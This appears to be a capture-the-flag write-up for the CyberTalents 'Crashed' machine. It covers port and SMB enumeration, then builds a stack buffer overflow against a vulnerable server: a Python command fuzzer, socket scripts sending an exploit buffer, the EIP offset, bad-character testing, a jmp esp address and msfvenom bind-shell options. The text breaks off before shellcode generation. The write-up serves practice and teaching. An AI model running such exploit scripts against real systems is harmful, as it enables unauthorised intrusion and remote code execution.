---
title: CyberTalents - Crashed                    # Add title of the machine here
image:
    path: /assets/images/crashed/CyberTalents.png
date: 2022-07-23 20:00:00 +0800                           # Change the date to match completion date
categories: CyberTalents                     # Change Templates to Writeup
description: "Impersonate me web challenge writeup"
tags: [cybertalents, writeup, bof]     # TAG names should always be lowercase; replace template with writeup, and add relevant 
toc: true
---


- [link](https://cybertalents.com/challenges/machines/crashed)


| CTF name | Crashed |
| -------- | ------- |
| Level    | Hard    |
| Points   | 200     |
| rating   | 4.5/5   |
| Created  | 2020-10 |


> Get The highest privilege on the machine and find the flag!


---

## Enumeration 
- Machine IP is '3.123.39.113' now, let's save it in a variable `export ip=3.123.39.113`

### Port Scanning

- First let's start scanning all the ports using `nmap` 
- `nmap -Pn -vv -sV -p- $ip`
	- `-Pn` Treat all hosts as online -- skip host discovery
	- `-vv` verbose 
	- `-sV` detect services Version
	- `-p-` scan all the ports (65535)
	- `$ip` the assigned variable which holds the machine IP
- scan result 

```bash
nmap -Pn -vv -sV -p- 3.123.39.113             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-23 07:38 EET  
NSE: Loaded 45 scripts for scanning.  
Nmap scan report for ec2-3-123-39-113.eu-central-1.compute.amazonaws.com (3.123.39.113)  
Host is up, received user-set (0.085s latency).  
Scanned at 2022-07-23 07:38:39 EET for 230s  
Not shown: 65516 closed tcp ports (conn-refused)  
PORT      STATE    SERVICE       REASON      VERSION  
21/tcp    open     ftp           syn-ack     FileZilla ftpd  
25/tcp    filtered smtp          no-response  
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC  
139/tcp   open     tcpwrapped    syn-ack  
445/tcp   open     microsoft-ds  syn-ack     Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  
1887/tcp  open     filex-lport?  syn-ack  
2525/tcp  filtered ms-v-worlds   no-response  
3389/tcp  open     ms-wbt-server syn-ack     Microsoft Terminal Services  
5357/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
37215/tcp filtered unknown       no-response  
47001/tcp open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC  
49665/tcp open     tcpwrapped    syn-ack  
49666/tcp open     tcpwrapped    syn-ack  
49667/tcp open     tcpwrapped    syn-ack  
49668/tcp open     msrpc         syn-ack     Microsoft Windows RPC  
49674/tcp open     msrpc         syn-ack     Microsoft Windows RPC  
49676/tcp open     msrpc         syn-ack     Microsoft Windows RPC   
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 229.94 seconds
```
- Note: I removed `-vv` output to not distract you.


### FTP Enumeration 
- First, let's try Anonymous login in ftp 
- after checking FTP, we found no anonymous login allowed 

### smb Enumeration 

```
smbclient -L //$ip -N          
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
       secret          Disk         
       Users           Disk         
       vulnserver-master Disk         
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 3.123.39.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available
```
- Let's check smb anonymous login
- Let's create a local directory to download these shares 

```bash
mkdir -p crashed/smb/{secret,users}
cd crashed/smb/secretls 
```

- check secret share

```
smbclient //$ip/secret  
Password for [WORKGROUP\juba]:  
Try "help" to get a list of possible commands.  
smb: \> ls    
 .                                   D        0  Sun Dec 26 00:05:12 2021  
 ..                                  D        0  Sun Dec 26 00:05:12 2021  
  
               7863807 blocks of size 4096. 3148456 blocks available  
smb: \> ls .*  
 .                                   D        0  Sun Dec 26 00:05:12 2021  
 ..                                  D        0  Sun Dec 26 00:05:12 2021  
  
               7863807 blocks of size 4096. 3148456 blocks available  
smb: \> exit  
╭─juba@Dell ~/crashed/smb/secret
╰─$
```

- Nothing here
- check users share

```
╭─juba@Dell ~/crashed/smb/users    
╰─$ smbclient //$ip/users  
Password for [WORKGROUP\juba]:  
Try "help" to get a list of possible commands.  
smb: \> ls    
 .                                  DR        0  Wed Sep  9 22:11:38 2020  
 ..                                 DR        0  Wed Sep  9 22:11:38 2020  
 Administrator                       D        0  Wed Jul 20 12:09:43 2022  
 Default                           DHR        0  Thu Jun 23 22:34:50 2022  
 desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018  
 Public                             DR        0  Thu Jun 23 22:34:50 2022  
  
               7863807 blocks of size 4096. 3148444 blocks available  
smb: \> RECURSE ON  
smb: \> PROMPT OFF  
smb: \> mget *    
smb: \> exit  
╭─juba@Dell ~/crashed/smb/users    
╰─$
```
- Commands explanation 
	- `RECURSE ON` turn on recursive mode 
	- `PROMPT OFF` turn off the prompt (don't ask you for Yes/No)
	- `mget *` Download all the files and directories 
- Discovering users share content 

<details>
<summary>users share content</summary>
<pre>
╭─juba@Dell ~/crashed/smb/users    
╰─$ tree         
.  
├── Administrator  
│   └── Desktop  
│       └── vulnserver-master  
│           ├── essfunc.dll  
│           └── super_secure_server.exe  
├── Default  
│   ├── AppData  
│   │   ├── Local  
│   │   │   ├── Microsoft  
│   │   │   │   ├── Windows  
│   │   │   │   │   ├── Caches  
│   │   │   │   │   ├── CloudStore  s
│   │   │   │   │   ├── GameExplorer  
│   │   │   │   │   ├── History  
│   │   │   │   │   │   ├── desktop.ini  
│   │   │   │   │   │   └── History.IE5  
│   │   │   │   │   ├── INetCache  
│   │   │   │   │   ├── INetCookies  
│   │   │   │   │   ├── PowerShell  
│   │   │   │   │   │   ├── ModuleAnalysisCache  
│   │   │   │   │   │   └── StartupProfileData-NonInteractive  
│   │   │   │   │   ├── Shell  
│   │   │   │   │   │   └── DefaultLayouts.xml  
│   │   │   │   │   ├── UsrClass.dat  
│   │   │   │   │   ├── UsrClass.dat{be2559f3-e827-11e8-81c1-0a917f905606}.TM.blf  
│   │   │   │   │   ├── UsrClass.dat{be2559f3-e827-11e8-81c1-0a917f905606}.TMContainer00000000000000000001.regtrans-ms  
│   │   │   │   │   ├── UsrClass.dat{be2559f3-e827-11e8-81c1-0a917f905606}.TMContainer00000000000000000002.regtrans-ms  
│   │   │   │   │   ├── UsrClass.dat.LOG1  
│   │   │   │   │   ├── UsrClass.dat.LOG2  
│   │   │   │   │   └── WinX  
│   │   │   │   │       ├── Group1  
│   │   │   │   │       │   ├── 1 - Desktop.lnk  
│   │   │   │   │       │   └── desktop.ini  
│   │   │   │   │       ├── Group2  
│   │   │   │   │       │   ├── 1 - Run.lnk  
│   │   │   │   │       │   ├── 2 - Search.lnk  
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk  
│   │   │   │   │       │   ├── 4 - Control Panel.lnk  
│   │   │   │   │       │   ├── 5 - Task Manager.lnk  
│   │   │   │   │       │   └── desktop.ini  
│   │   │   │   │       └── Group3  
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk  
│   │   │   │   │           ├── 01 - Command Prompt.lnk  
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk  
│   │   │   │   │           ├── 02 - Command Prompt.lnk  
│   │   │   │   │           ├── 03 - Computer Management.lnk  
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk  
│   │   │   │   │           ├── 04 - Disk Management.lnk  
│   │   │   │   │           ├── 05 - Device Manager.lnk  
│   │   │   │   │           ├── 06 - SystemAbout.lnk  
│   │   │   │   │           ├── 07 - Event Viewer.lnk  
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk  
│   │   │   │   │           ├── 09 - Mobility Center.lnk  
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk  
│   │   │   │   │           └── desktop.ini  
│   │   │   │   └── Windows Sidebar  
│   │   │   │       ├── Gadgets  
│   │   │   │       └── settings.ini  
│   │   │   └── Temp  
│   │   ├── LocalLow  
│   │   │   └── Microsoft  
│   │   │       └── CryptnetUrlCache  
│   │   │           ├── Content  
│   │   │           │   ├── 57C8EDB95DF3F0AD4EE2DC2B8CFD4157  
│   │   │           │   ├── 77EC63BDA74BD0D0E0426DC8F8008506  
│   │   │           │   ├── 8890A77645B73478F5B1DED18ACBF795_C090A8C88B266C6FF99A97210E92B44D  
│   │   │           │   ├── DA3B6E45325D5FFF28CF6BAD6065C907_31527056D47F4392EDC1FB945529604F  
│   │   │           │   └── FB0D848F74F70BB2EAA93746D24D9749  
│   │   │           └── MetaData  
│   │   │               ├── 57C8EDB95DF3F0AD4EE2DC2B8CFD4157  
│   │   │               ├── 77EC63BDA74BD0D0E0426DC8F8008506  
│   │   │               ├── 8890A77645B73478F5B1DED18ACBF795_C090A8C88B266C6FF99A97210E92B44D  
│   │   │               ├── DA3B6E45325D5FFF28CF6BAD6065C907_31527056D47F4392EDC1FB945529604F  
│   │   │               └── FB0D848F74F70BB2EAA93746D24D9749  
│   │   └── Roaming  
│   │       └── Microsoft  
│   │           ├── Internet Explorer  
│   │           │   └── Quick Launch  
│   │           │       ├── desktop.ini  
│   │           │       ├── Shows Desktop.lnk  
│   │           │       └── Window Switcher.lnk  
│   │           └── Windows  
│   │               ├── CloudStore  
│   │               ├── Network Shortcuts  
│   │               ├── Printer Shortcuts  
│   │               ├── Recent  
│   │               │   └── AutomaticDestinations  
│   │               │       ├── 5f7b5f1e01b83767.automaticDestinations-ms  
│   │               │       └── f01b4d95cf55d32a.automaticDestinations-ms  
│   │               ├── SendTo  
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget  
│   │               │   ├── Desktop (create shortcut).DeskLink  
│   │               │   ├── Desktop.ini  
│   │               │   └── Mail Recipient.MAPIMail  
│   │               ├── Start Menu  
│   │               │   └── Programs  
│   │               │       ├── Accessibility  
│   │               │       │   ├── desktop.ini  
│   │               │       │   ├── Magnify.lnk  
│   │               │       │   ├── Narrator.lnk  
│   │               │       │   └── On-Screen Keyboard.lnk  
│   │               │       ├── Accessories  
│   │               │       │   ├── desktop.ini  
│   │               │       │   └── Notepad.lnk  
│   │               │       ├── Maintenance  
│   │               │       │   └── Desktop.ini  
│   │               │       ├── Startup  
│   │               │       │   └── RunWallpaperSetupInit.cmd  
│   │               │       └── System Tools  
│   │               │           ├── Administrative Tools.lnk  
│   │               │           ├── Command Prompt.lnk  
│   │               │           ├── computer.lnk  
│   │               │           ├── Control Panel.lnk  
│   │               │           ├── Desktop.ini  
│   │               │           ├── File Explorer.lnk  
│   │               │           └── Run.lnk  
│   │               └── Templates  
│   ├── Desktop  
│   │   ├── EC2 Feedback.website  
│   │   └── EC2 Microsoft Windows Guide.website  
│   ├── Documents  
│   ├── Downloads  
│   ├── Favorites  
│   ├── Links  
│   ├── Music  
│   ├── NTUSER.DAT  
│   ├── ntuser.ini  
│   ├── Pictures  
│   ├── Saved Games  
│   └── Videos  
├── desktop.ini  
└── Public  
   ├── AccountPictures  
   │   └── desktop.ini  
   ├── desktop.ini  
   ├── Documents  
   │   └── desktop.ini  
   ├── Downloads  
   │   └── desktop.ini  
   ├── Libraries  
   │   ├── desktop.ini  
   │   └── RecordedTV.library-ms  
   ├── Music  
   │   └── desktop.ini  
   ├── Pictures  
   │   └── desktop.ini  
   └── Videos  
       └── desktop.ini  
  
65 directories, 83 files

</pre>


</details>

- `Administrator/Desktop/vulnserver-master/super_secure_server.exe` I'm going to run this server on a windows 7 Virtual machine

---

## Buffer Overflow 
### Tools: 
#### [Immunity-Debugger](https://www.immunityinc.com/products/debugger/)
#### [mona scripts](https://github.com/corelan/mona) and python3.9

### Buffer Overflow steps 
#### Spiking (finding the vulnerable command/part) 
#### Fuzzing
#### Finding the offset
#### Overwriting EIP
#### Finding bad characters
#### Finding the right module
#### Generating shellcode
#### Gaining access

- copy `super_secure_server.exe` and `essfunc.dll` to windows machine 
- run the server 

![run the server](/assets/images/crashed/run_server.png)
- let's do nmap port scan to know this service port number 

```
Nmap scan report for 192.168.1.4  
Host is up, received user-set (0.00047s latency).  
Scanned at 2022-07-23 09:10:35 EET for 248s  
Not shown: 65521 closed tcp ports (conn-refused)  
PORT      STATE SERVICE      REASON  VERSION  
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC  
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)  
554/tcp   open  rtsp?        syn-ack  
2869/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
5357/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
10243/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
13337/tcp open  unknown      syn-ack  
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC  
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC  
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC  
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC  
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC  
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC   
  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 254.45 seconds
```
- there is unknown service running in port 13337 I think it's `super_secure_server.exe`, let's check that 

```bash
nc  $WinIP 13337                                                                                                                                                                             
Welcome to the super secure server! Enter HELP for help  
  
HELP  
  
No commands to show just find it your self
```

---
### building a [command fuzzer](https://github.com/juba0x00/Command-Fuzzer) 
```python
#!/usr/bin/env python3

import socket, argparse

# colors 
RED = '\033[31m'
RESET = '\033[0m'
YELLOW = '\033[33m'
GREEN = '\033[32m'
CYAN = '\033[36m' 
BOLD = '\033[1m'

# creating argument parser object
ArgParser = argparse.ArgumentParser(
	description='DESCRIPTION: Fuzzing Crashed challenge command ',
	usage='./CommandFuzzer.py <ip> <port> <wordlist> [OPTIONS]',
	add_help=True
	)  

# adding arguments 
ArgParser.add_argument('ip', help="Specify the IP address")
ArgParser.add_argument('port', help="Specify the port number")
ArgParser.add_argument('wordlist', help="Specify the wordlist")
ArgParser.add_argument('-v', '--verbose', help='verbose mode', action='store_true')

# parsing the arguments
args = ArgParser.parse_args()

# try to open the wordlist file and read its content 
try:
	WordlistFile = open(args.wordlist, 'r')
	commands = WordlistFile.readlines() # commands with \n at the end
	WordlistFile.close() # close the file object 
except Exception as FileError:
	print(FileError) 
	exit(1) # exit the program, not wordlist found

commands = [command.replace('\n', '').upper() for command in commands] # remove \n and converting to uppercase


for command in commands:
	try:	
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # create socket object called 's'
		
			s.connect((args.ip, int(args.port))) # connect to the given IP and port 
			s.recv(1024) # receive the banner
			s.send(bytes(command, "latin-1")) # send the command 
			server_reponse = s.recv(1024).decode() # receive the response 
			
				if args.verbose: # check verbosity mode 
				print(f"Testing: {GREEN}{command}{RESET} Command")
				
			if 'UNKNOWN COMMAND' not in server_reponse: # check if the command exists 
				print(f"{RED}{BOLD}{command} {CYAN}command found")
				print(f"server response: {YELLOW}{server_reponse}{RESET}")
		
	except Exception as ConnectionError: # connection error 
		print(ConnectionError)
		exit(0)
```

- With verbose 
![verbose](/assets/images/crashed/verbose.png)
- Without verbose

 ![no verbose](/assets/images/crashed/no_verbose.png)

---

### Fuzzing 
-  Let's start fuzzing the command buffer 
 ![fuzzing](/assets/images/crashed/fuzzing.png)
 ![fuzzing_crash](/assets/images/crashed/fuzzing_crash.png)

---

### Finding the offset 
1. run the server 
2. open Immunity-Debugger 
3. click file -> attach then chose the server name "super_secure_server"
4. `F9` to start the program
- to find the offset we need to generate a pattern using `msf-pattern_create`

```bash
╭─juba@Dell ~/crashed    
╰─$ msf-pattern_create -l 1500  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```

```python
#!/usr/bin/env python3

import socket

ip = '192.168.1.4' # change it
port = 13337


command = "SECRET " 
overflow = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9'


buffer = command + overflow

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")

```

![find offset](/assets/images/crashed/find_offset.png)
- We can notice two things: 
	- the program status is "Paused"
	- the EIP value is "68423268"
- Let's use `msf-pattern_offset` to calculate the offset 

```bash
msf-pattern_offset -l 1500 -q 68423268    
[*] Exact match at offset 997
```
---

### Overwrite EIP 

```python
#!/usr/bin/env python3
import socket

ip = '192.168.1.4' # change it
port = 13337

command = "SECRET "
overflow = 'A' * 997
EIP = 'BBBB'

buffer = command + overflow + EIP + overflow

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```


![overwrite EIP](/assets/images/crashed/overwrite_eip.png)

---

### Find the bad characters 

- to find the bad characters we should send hexadecimal values from `0x00` to `0xFF` (all possible hexadecimal characters)

```python
#!/usr/bin/env python3

import socket

ip = '192.168.1.4' # change it 
port = 13337
command = "SECRET " 
offset = 997
overflow = 'A' * offset
EIP = 'BBBB'

hexchars = ""
hexchars += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f\x20"
hexchars += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
hexchars += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
hexchars += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
hexchars += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
hexchars += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
hexchars += "\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
hexchars += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
  
buffer = command + overflow + EIP + hexchars
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```

- we will not send `0x00` because it's null byte (bad character)
#### there are to ways to check bad characters 
1. checking it manually by reading all the hex characters and comparing it with the sent, if you didn't find a specific character or it has corrupted the remaining characters add it to your bad characters list.
2. using `mona`


##### manually 
![find_badchars.png](/assets/images/crashed/find_badchars.png)
- right click on `ESP` (Extended Stack Pointer) and click "Follow in Dump", then compare the dump with the sent characters 

##### Using `mona`

```
!mona config -set workingfolder C:\mona\%p
!mona bytearray -b '\x00'
!mona compare -f c:\mona\super_secure_serverbytearray.bin -a <ESP addr>
```

- `\x00` is the only bad character 

---

### Finding the right module 
![modules.png](/assets/images/crashed/modules.png)
- there are two modules with no protections
	- the program itself (super_secure_server.exe)
	- essfunc.dll
- we should avoid searching for `jmp` instruction in `super_secure_server.exe` because it starts with a bad character (`\x00`), so if we overwrite the `EIP` the bad character will corrupt the rest of the address 
- we will use search for `jmp esp` instruction in  `essfunc.dll` module
- to search for `jmp esp` we should know it's hex value, we can use `msf-nasm_shell` to know it (it's easy, just "FFE4")

```bash
╭─juba@Dell ~/crashed    
╰─$ msf-nasm_shell                            
nasm > jmp esp  
00000000  FFE4              jmp esp  
nasm >
```
![jmp_esp.png](/assets/images/crashed/jmp_esp.png)

- we can use any pointer of these pointers, for example `625012A0`

---
### Generating shell code 
list payload options 

```bash
╰─~ msfvenom --list-options --payload=windows/shell_bind_tcp                                                                                                                                                                         130 ↵  
Options for payload/windows/shell_bind_tcp:  
=========================  
  
  
      Name: Windows Command Shell, Bind TCP Inline  
    Module: payload/windows/shell_bind_tcp  
  Platform: Windows  
      Arch: x86  
Needs Admin: No  
Total size: 328  
      Rank: Normal  
  
Provided by:  
   vlad902 <vlad902@gmail.com>  
   sf <stephen_fewer@harmonysecurity.com>  
  
Basic options:  
Name      Current Setting  Required  Description  
----      ---------------  --------  -----------  
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)  
LPORT     4444             yes       The listen port  
RHOST                      no        The target address  
  
Description:  
 Listen for a connection and spawn a command shell  
  
  
  
Advanced options for payload/windows/shell_bind_tcp:  
=========================  
  
   Name                        Current Setting  Required  Description  
   ----                        ---------------  --------  -----------  
   AutoRunScript                                no        A script to run automatically on session creation.  
   AutoVerifySession           true             yes       Automatically verify and drop invalid sessions  
   CommandShellCleanupCommand                   no        A command to run before the session is closed  
   CreateSession               true             no        Create a new session for every successful login  
   InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)  
   PrependMigrate              false            yes       Spawns and runs shellcode in new process  
   PrependMigrateProc                           no        Process to spawn and run shellcode in  
   VERBOSE                     false            no        Enable detailed status messages  
   WORKSPACE                                    no        Specify the workspace for this module  
  
Evasion options for payload/windows/shell_bind_tcp:  
=========================  
  
   Name  Current Setting  Required  Description  
   ----  ---------------  --------  -----------  
╭─root@Dell ~    
╰─#
```


```bash
╭─root@Dell ~    
